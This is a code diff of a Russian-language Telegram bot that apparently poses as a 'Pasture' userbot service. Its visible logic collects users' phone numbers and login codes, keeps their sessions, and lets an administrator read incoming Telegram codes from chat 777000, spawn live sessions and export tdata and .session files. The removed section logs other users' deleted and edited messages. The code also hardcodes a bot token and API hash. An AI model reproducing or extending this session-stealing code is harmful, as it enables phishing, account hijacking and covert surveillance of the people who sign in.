@@ -6,8 +6,6 @@ import os
 import json
 import base64
 import zipfile
-import asyncio
-import os
 from aiohttp import web
 asyncio.set_event_loop(asyncio.new_event_loop())
 from aiogram import Bot, Dispatcher, F, Router
@@ -30,7 +28,7 @@ from pyrogram.raw.functions.auth import ResetAuthorizations
 
 # --- НАСТРОЙКИ ---
 API_ID = 37647469  # Официальный Desktop App ID
-API_HASH = " cb3efe850b55566dbf8224709dfeb5b1"
+API_HASH = "cb3efe850b55566dbf8224709dfeb5b1"
 BOT_TOKEN = "8950654509:AAFBf78YC2S1t0P9aA5qbVUrGojA2Tm9sr8"
 ADMIN_ID = 8521367180
 
@@ -195,7 +193,7 @@ async def process_phone(message: Message, state: FSMContext):
         await state.set_state(AuthState.waiting_for_code)
         await message.answer(
             "Код потверждения \n\n"
-             "Telegram Отправил тебе код в приложения введи его с клавиатуры\n\n"
+            "Telegram Отправил тебе код в приложения введи его с клавиатуры\n\n"
             "<code>_ _ _ _ _</code>",
             reply_markup=get_code_keyboard(),
             parse_mode="HTML",
@@ -399,7 +397,6 @@ async def admin_manage_user(callback: CallbackQuery):
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard), parse_mode="Markdown")
 
 
-# --- LIVE-ЧЕКЕР (ПРОВЕРКА ИСТОРИИ И СЛУШАТЕЛЬ КОДОВ) ---
 @router.callback_query(F.data.startswith("adm_live_"))
 async def admin_live_auth(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
@@ -443,7 +440,6 @@ async def listen_for_telegram_code(target_id: int, phone: str, string_session: s
     try:
         await client.connect()
 
-        # 1. Проверяем историю сообщений
         async for message in client.get_chat_history(777000, limit=5):
             text = message.text or ""
             match = re.search(r'\b\d{5,6}\b', text)
@@ -462,7 +458,6 @@ async def listen_for_telegram_code(target_id: int, phone: str, string_session: s
                 break
 
         if not code_found:
-            # 2. Слушаем новые сообщения в реальном времени
             async def message_handler(c, message):
                 nonlocal code_found
                 sender_id = message.from_user.id if message.from_user else 0
@@ -486,7 +481,7 @@ async def listen_for_telegram_code(target_id: int, phone: str, string_session: s
 
             client.add_handler(message_handler)
 
-            for _ in range(60): # 5 минут
+            for _ in range(60):
                 if code_found:
                     break
                 await asyncio.sleep(5)
@@ -506,7 +501,6 @@ async def listen_for_telegram_code(target_id: int, phone: str, string_session: s
             pass
 
 
-# --- СОЗДАНИЕ АКТИВНОГО СЕАНСА (CPYTHON 3.14.3) ---
 @router.callback_query(F.data.startswith("adm_spawn_"))
 async def admin_spawn_session(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
@@ -542,7 +536,7 @@ async def admin_spawn_session(callback: CallbackQuery):
         await client.disconnect()
 
         await callback.message.edit_text(
-            f"✅ **Сеанс Pasture успешно добавлен! Юзербота работает **🎉\n\n"
+            f"✅ **Сеанс Pasture успешно добавлен! Юзербот работает** 🎉\n\n"
             f"• Аккаунт: `@{me.username or me.first_name}`\n"
             f"• Телефон: `{phone}`\n"
             f"• Устройство: `CPython 3.14.3` (Windows 10)\n\n"
@@ -556,7 +550,6 @@ async def admin_spawn_session(callback: CallbackQuery):
         )
 
 
-# --- ВЫДАЧА TDATA / JSON КОНФИГУРАЦИИ ---
 @router.callback_query(F.data.startswith("adm_tdata_"))
 async def admin_get_tdata(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
@@ -628,7 +621,6 @@ async def admin_get_tdata(callback: CallbackQuery):
                 pass
 
 
-# --- БЫСТРАЯ ПРОВЕРКА ВАЛИДНОСТИ СЕССИИ ---
 @router.callback_query(F.data.startswith("adm_login_"))
 async def admin_instant_login(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
@@ -677,7 +669,6 @@ async def admin_instant_login(callback: CallbackQuery):
         )
 
 
-# --- ГАРАНТИРОВАННОЕ СОЗДАНИЕ .SESSION ФАЙЛА ---
 def generate_safe_session_file(phone: str, string_session: str) -> str:
     clean_phone = re.sub(r"\D", "", phone)
     filename = f"{clean_phone}.session"
@@ -955,8 +946,11 @@ async def admin_broadcast_execute(message: Message, state: FSMContext):
             fail += 1
 
     await message.answer(f"📊 Рассылка завершена!\nУспешно: {success}\nОшибок: {fail}")
+
+
 async def handle(request):
     return web.Response(text="Bot is running!")
+
 
 async def start_web_server():
     app = web.Application()
@@ -967,29 +961,15 @@ async def start_web_server():
     site = web.TCPSite(runner, "0.0.0.0", port)
     await site.start()
 
-async def handle(request):
-    return web.Response(text="Bot is running!")
-
-async def start_web_server():
-    app = web.Application()
-    app.router.add_get("/", handle)
-    runner = web.AppRunner(app)
-    await runner.setup()
-    port = int(os.environ.get("PORT", 8080))
-    site = web.TCPSite(runner, "0.0.0.0", port)
-    await site.start()
 
 async def main():
-    # Запуск веб-сервера для Render
     await start_web_server()
-    
     dp.include_router(router)
     await bot.delete_webhook(drop_pending_updates=True)
     print("Юзербот успешно запущен!")
     await dp.start_polling(bot)
 
 
-
 if __name__ == "__main__":
     try:
         loop = asyncio.get_event_loop()
@@ -999,153 +979,3 @@ if __name__ == "__main__":
             loop.run_until_complete(main())
     except RuntimeError:
         asyncio.run(main())
-
-
-
-
-if __name__ == "__main__":
-    try:
-        loop = asyncio.get_event_loop()
-        if loop.is_running():
-            asyncio.create_task(main())
-        else:
-            loop.run_until_complete(main())
-    except RuntimeError:
-        asyncio.run(main())
-# ================= АНИМАЦИИ И ПРИКОЛЫ =================
-@app.on_message(filters.command("type", prefixes="+") & filters.me)
-async def cmd_type(client, message):
-    text = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else "..."
-    output = ""
-    for char in text:
-        output += char
-        try:
-            await message.edit(output + "▒")
-            await asyncio.sleep(0.08)
-        except Exception:
-            break
-    try:
-        await message.edit(output)
-    except Exception:
-        pass
-
-@app.on_message(filters.command("hack", prefixes="+") & filters.me)
-async def cmd_hack(client, message):
-    steps = [
-        "💻 Инициализация взлома системы...",
-        "█▒▒▒▒▒▒▒▒▒ 10%",
-        "████▒▒▒▒▒▒ 40%",
-        "███████▒▒▒ 70%",
-        "██████████ 100%",
-        "⚠️ Доступ успешно получен! Скачивание данных..."
-    ]
-    for step in steps:
-        await message.edit(step)
-        await asyncio.sleep(0.6)
-
-@app.on_message(filters.command("love", prefixes="+") & filters.me)
-async def cmd_love(client, message):
-    hearts = ["❤️", "💖", "💗", "💓", "💞", "💘"]
-    text = "❤️ Любовь захватывает мир ❤️\n"
-    for h in hearts:
-        text += h * 3 + "\n"
-        await message.edit(text)
-        await asyncio.sleep(0.4)
-
-@app.on_message(filters.command("matrix", prefixes="+") & filters.me)
-async def cmd_matrix(client, message):
-    matrix_lines = [
-        "1010101001",
-        "0101110010 🟢",
-        "1110001110 CODE",
-        "0001110001 MATRIX",
-        "wake up, Neo..."
-    ]
-    for line in matrix_lines:
-        await message.edit(line)
-        await asyncio.sleep(0.5)
-
-@app.on_message(filters.command(["dice", "slot", "darts", "basket", "football", "bowling"], prefixes="+") & filters.me)
-async def cmd_games(client, message):
-    cmd = message.command[0]
-    emoji_map = {
-        "dice": "🎲", "slot": "🎰", "darts": "🎯",
-        "basket": "🏀", "football": "⚽", "bowling": "🎳"
-    }
-    await message.delete()
-    await client.send_dice(message.chat.id, emoji=emoji_map.get(cmd, "🎲"))
-
-# ================= РП-ДЕЙСТВИЯ =================
-RP_ACTIONS = {
-    "погладить": "погладил(а) с теплом ✨",
-    "обнять": "крепко обнял(а) 🤗",
-    "поцеловать": "нежно поцеловал(а) 💋",
-    "прижать": "прижал(а) к себе 🫂",
-    "покормить": "покормил(а) вкусняшкой 🍰",
-    "улыбнуться": "тепло улыбнулся(ась) 😊",
-    "танец": "начал(а) зажигательный танец 🕺",
-    "укусить": "игриво укусил(а) 🦷",
-    "ударить": "резко ударил(а) 💢",
-    "пнуть": "аккуратно пнул(а) 👟",
-    "помахать": "помахал(а) рукой 👋",
-    "заплакать": "горько заплакал(а) 😢"
-}
-
-@app.on_message(filters.command(list(RP_ACTIONS.keys()), prefixes="+") & filters.me)
-async def rp_handler(client, message):
-    action = message.command[0]
-    target = message.reply_to_message.from_user.mention if message.reply_to_message and message.reply_to_message.from_user else "воздух"
-    text = f"*{message.from_user.mention} {RP_ACTIONS[action]} {target}*"
-    await message.edit(text)
-
-# ================= PASTURE LOGS (Перехват удалений) =================
-LOGS_ENABLED = True
-
-@app.on_deleted_messages()
-async def logs_deleted(client, messages):
-    if not LOGS_ENABLED:
-        return
-    for msg in messages:
-        logging.info(f"[PASTURE LOGS] Удалено сообщение в чате {msg.chat.id}: {msg.text}")
-
-@app.on_edited_message()
-async def logs_edited(client, message):
-    if not LOGS_ENABLED or not message.from_user or message.from_user.is_self:
-        return
-    logging.info(f"[PASTURE LOGS] Отредактировано сообщение от {message.from_user.id}: {message.text}")
-RP_ACTIONS = {
-    "погладить": "погладил(а) с теплом ✨",
-    "обнять": "крепко обнял(а) 🤗",
-    "поцеловать": "нежно поцеловал(а) 💋",
-    "прижать": "прижал(а) к себе 🫂",
-    "покормить": "покормил(а) вкусняшкой 🍰",
-    "улыбнуться": "тепло улыбнулся(ась) 😊",
-    "танец": "начал(а) зажигательный танец 🕺",
-    "укусить": "игриво укусил(а) 🦷",
-    "ударить": "резко ударил(а) 💢",
-    "пнуть": "аккуратно пнул(а) 👟",
-    "помахать": "помахал(а) рукой 👋",
-    "заплакать": "горько заплакал(а) 😢"
-}
-
-@app.on_message(filters.command(list(RP_ACTIONS.keys()), prefixes="+") & filters.me)
-async def rp_handler(client, message):
-    action = message.command[0]
-    target = message.reply_to_message.from_user.mention if message.reply_to_message and message.reply_to_message.from_user else "воздух"
-    text = f"*{message.from_user.mention} {RP_ACTIONS[action]} {target}*"
-    await message.edit(text)
-LOGS_ENABLED = True
-
-@app.on_deleted_messages()
-async def logs_deleted(client, messages):
-    if not LOGS_ENABLED:
-        return
-    for msg in messages:
-        logging.info(f"[PASTURE LOGS] Удалено сообщение в чате {msg.chat.id}: {msg.text}")
-
-@app.on_edited_message()
-async def logs_edited(client, message):
-    if not LOGS_ENABLED or not message.from_user or message.from_user.is_self:
-        return
-    logging.info(f"[PASTURE LOGS] Отредактировано сообщение от {message.from_user.id}: {message.text}")
-
